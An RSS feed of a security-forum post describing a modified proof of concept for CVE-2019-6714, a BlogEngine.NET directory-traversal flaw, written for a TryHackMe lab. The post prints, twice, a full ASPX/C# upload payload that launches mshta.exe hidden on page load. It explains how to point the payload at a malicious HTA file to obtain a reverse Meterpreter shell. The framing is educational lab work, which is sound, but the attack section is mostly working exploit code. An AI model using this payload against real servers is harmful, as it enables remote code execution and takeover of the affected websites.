<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Modified CVE-2019-6714 PoC to execute payload via mshta.exe</title>
    <link>https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728</link>
    <description>Hey y&#39;all. This will be a quick post discussing my experience in exploit development where I modify the exploit for the CVE-2019-6714 vulnerability; specifically the exploit devevloped by [Cobb (2019)](https://www.exploit-db.com/exploits/46353), which exploits a directory traversal vulnerability in the [BlogEngine[.]NET](https://blogengine.io/) content management system. 

This was done for a [TryHackMe](https://tryhackme.com/) boot2root machine --- which I documented in the _InfoSec Write-ups_ journal (see [&quot;Aleksey&quot; 2022a](https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262); if the paywall is giving you problems, you can view it by opening your browser in private mode ;-) ). 

I discuss the specifics on how to exploit this vulnerability in my writeup, but TL;DR --- it works by uploading a C# script onto a BlogEngine[.]NET powered website that is vulnerable to CVE-2019-6714 and then triggering the exploit to execute via a GET request to said C# script. 

I posted my modified version of Cobb&#39;s exploit onto [one of my GitHub repos](https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs). The source code, minus the comments, of my modified exploit is:

```c#
&lt;%@ Control Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; EnableViewState=&quot;false&quot; Inherits=&quot;BlogEngine.Core.Web.Controls.PostViewBase&quot; %&gt;
&lt;%@ Import Namespace=&quot;BlogEngine.Core&quot; %&gt;

&lt;script runat=&quot;server&quot;&gt;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);
        System.Diagnostics.Process payload = new System.Diagnostics.Process();
        payload.StartInfo.FileName = &quot;mshta.exe&quot;;
        payload.StartInfo.Arguments = &quot;&quot;;
        payload.StartInfo.UseShellExecute = true;
        payload.StartInfo.CreateNoWindow = true;
        payload.Start();
    }
    
&lt;/script&gt;
&lt;asp:PlaceHolder ID=&quot;phContent&quot; runat=&quot;server&quot; EnableViewState=&quot;false&quot;&gt;&lt;/asp:PlaceHolder&gt;
```

Cobb&#39;s original exploit uses C# network sockets libraries to make a reverse shell onto the attacker&#39;s machine. The TryHackMe room had me &quot;upgrade&quot; my shell to the Meterpreter shell, but I decided to bypass that by modify Cobb&#39;s exploit to execute code via ``mshta.exe``, then generate a Meterpreter payload that executes via an HTA server, then upload this script to the BlogEngine[.]NET website, trigger it and finally get a reverse Meterpreter shell. The line ``payload.StartInfo.Arguments = &quot;&quot;;`` should contain the URL to the malicious HTA file to execute a payload (note that the HTA server could be any payload, not necessarily a reverse Meterpreter shell). 

## Conclusion

This isn&#39;t really a remarkable discovery --- just &quot;building off&quot; the discovery of someone smarter than myself and trying to make my life easier. Plus, I&#39;m trying to be a hacker --- and what made me want to do go on with modifying Cobb&#39;s exploit is that I didn&#39;t want to follow the room&#39;s instructions exactly as laid out. I gotta deviate from it in some way ;-)

Of course, I welcome any feedback or criticisms regarding my work :D

## References

* &quot;Aleksey&quot; (2022a). _TryHackMe writeup: HackPark_. InfoSec Write-ups. Retrieved on Dec. 31, 2022 from: [https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262](https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262)

* &quot;Aleksey&quot; (2022b). _Infosec/CVE-2019-6714.cs_ GitHub Repository. Retrieved on Dec. 31, 2022 from: [https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs](https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs)

* BlogEngine.NET (n.d.). *BlogEngine.NET | Free blogging platform*. Retrieved on May 7, 2022 from: [https://blogengine.io/](https://blogengine.io/)

* Cobb, D. (2019). _BlogEngine.NET &lt;= 3.3.6 Directory Traversal RCE_. Exploit Database. Retrieved on Dec. 31, 2022 from: https://www.exploit-db.com/exploits/46353

* TryHackMe (n.d.). Retrieved on Dec. 31, 2022 from: https://tryhackme.com/

* TryHackMe (n.d.-b). *HackPark*. TryHackMe. Retrieved from Dec. 31, 2022 from: [https://tryhackme.com/room/hackpark](https://tryhackme.com/room/hackpark)</description>
    
    <lastBuildDate>Sun, 01 Jan 2023 00:52:55 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Modified CVE-2019-6714 PoC to execute payload via mshta.exe</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728/2</link>
        <pubDate>Tue, 02 May 2023 14:47:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-32728-2</guid>
        <source url="https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728.rss">Modified CVE-2019-6714 PoC to execute payload via mshta.exe</source>
      </item>
      <item>
        <title>Modified CVE-2019-6714 PoC to execute payload via mshta.exe</title>
        <dc:creator><![CDATA[LambdaCalculus]]></dc:creator>
        <description><![CDATA[
            <p>Hey y’all. This will be a quick post discussing my experience in exploit development where I modify the exploit for the CVE-2019-6714 vulnerability; specifically the exploit devevloped by <a href="https://www.exploit-db.com/exploits/46353" rel="noopener nofollow ugc">Cobb (2019)</a>, which exploits a directory traversal vulnerability in the <a href="https://blogengine.io/" rel="noopener nofollow ugc">BlogEngine[.]NET</a> content management system.</p>
<p>This was done for a <a href="https://tryhackme.com/" rel="noopener nofollow ugc">TryHackMe</a> boot2root machine — which I documented in the <em>InfoSec Write-ups</em> journal (see <a href="https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262" rel="noopener nofollow ugc">“Aleksey” 2022a</a>; if the paywall is giving you problems, you can view it by opening your browser in private mode <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"> ).</p>
<p>I discuss the specifics on how to exploit this vulnerability in my writeup, but TL;DR — it works by uploading a C# script onto a BlogEngine[.]NET powered website that is vulnerable to CVE-2019-6714 and then triggering the exploit to execute via a GET request to said C# script.</p>
<p>I posted my modified version of Cobb’s exploit onto <a href="https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs" rel="noopener nofollow ugc">one of my GitHub repos</a>. The source code, minus the comments, of my modified exploit is:</p>
<pre><code class="lang-auto">&lt;%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %&gt;
&lt;%@ Import Namespace="BlogEngine.Core" %&gt;

&lt;script runat="server"&gt;

    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);
        System.Diagnostics.Process payload = new System.Diagnostics.Process();
        payload.StartInfo.FileName = "mshta.exe";
        payload.StartInfo.Arguments = "";
        payload.StartInfo.UseShellExecute = true;
        payload.StartInfo.CreateNoWindow = true;
        payload.Start();
    }
    
&lt;/script&gt;
&lt;asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"&gt;&lt;/asp:PlaceHolder&gt;
</code></pre>
<p>Cobb’s original exploit uses C# network sockets libraries to make a reverse shell onto the attacker’s machine. The TryHackMe room had me “upgrade” my shell to the Meterpreter shell, but I decided to bypass that by modify Cobb’s exploit to execute code via <code>mshta.exe</code>, then generate a Meterpreter payload that executes via an HTA server, then upload this script to the BlogEngine[.]NET website, trigger it and finally get a reverse Meterpreter shell. The line <code>payload.StartInfo.Arguments = "";</code> should contain the URL to the malicious HTA file to execute a payload (note that the HTA server could be any payload, not necessarily a reverse Meterpreter shell).</p>
<h2>
<a name="conclusion-1" class="anchor" href="https://0x00sec.org#conclusion-1"></a>Conclusion</h2>
<p>This isn’t really a remarkable discovery — just “building off” the discovery of someone smarter than myself and trying to make my life easier. Plus, I’m trying to be a hacker — and what made me want to do go on with modifying Cobb’s exploit is that I didn’t want to follow the room’s instructions exactly as laid out. I gotta deviate from it in some way <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=12" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></p>
<p>Of course, I welcome any feedback or criticisms regarding my work <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=12" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
<h2>
<a name="references-2" class="anchor" href="https://0x00sec.org#references-2"></a>References</h2>
<ul>
<li>
<p>“Aleksey” (2022a). <em>TryHackMe writeup: HackPark</em>. InfoSec Write-ups. Retrieved on Dec. 31, 2022 from: <a href="https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262" rel="noopener nofollow ugc">https://infosecwriteups.com/tryhackme-writeup-hackpark-bd9c075c5262</a></p>
</li>
<li>
<p>“Aleksey” (2022b). <em>Infosec/CVE-2019-6714.cs</em> GitHub Repository. Retrieved on Dec. 31, 2022 from: <a href="https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs" rel="noopener nofollow ugc">https://github.com/Alekseyyy/InfoSec/blob/master/exploits/CVE-2019-6714.cs</a></p>
</li>
<li>
<p><a href="http://BlogEngine.NET" rel="noopener nofollow ugc">BlogEngine.NET</a> (n.d.). <em><a href="http://BlogEngine.NET" rel="noopener nofollow ugc">BlogEngine.NET</a> | Free blogging platform</em>. Retrieved on May 7, 2022 from: <a href="https://blogengine.io/" rel="noopener nofollow ugc">https://blogengine.io/</a></p>
</li>
<li>
<p>Cobb, D. (2019). <em><a href="http://BlogEngine.NET" rel="noopener nofollow ugc">BlogEngine.NET</a> &lt;= 3.3.6 Directory Traversal RCE</em>. Exploit Database. Retrieved on Dec. 31, 2022 from: <a href="https://www.exploit-db.com/exploits/46353" class="inline-onebox" rel="noopener nofollow ugc">BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution - ASPX webapps Exploit</a></p>
</li>
<li>
<p>TryHackMe (n.d.). Retrieved on Dec. 31, 2022 from: <a href="https://tryhackme.com/" rel="noopener nofollow ugc">https://tryhackme.com/</a></p>
</li>
<li>
<p>TryHackMe (n.d.-b). <em>HackPark</em>. TryHackMe. Retrieved from Dec. 31, 2022 from: <a href="https://tryhackme.com/room/hackpark" rel="noopener nofollow ugc">https://tryhackme.com/room/hackpark</a></p>
</li>
</ul>
          <p><a href="https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728/1</link>
        <pubDate>Sat, 31 Dec 2022 22:46:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-32728-1</guid>
        <source url="https://0x00sec.org/t/modified-cve-2019-6714-poc-to-execute-payload-via-mshta-exe/32728.rss">Modified CVE-2019-6714 PoC to execute payload via mshta.exe</source>
      </item>
  </channel>
</rss>
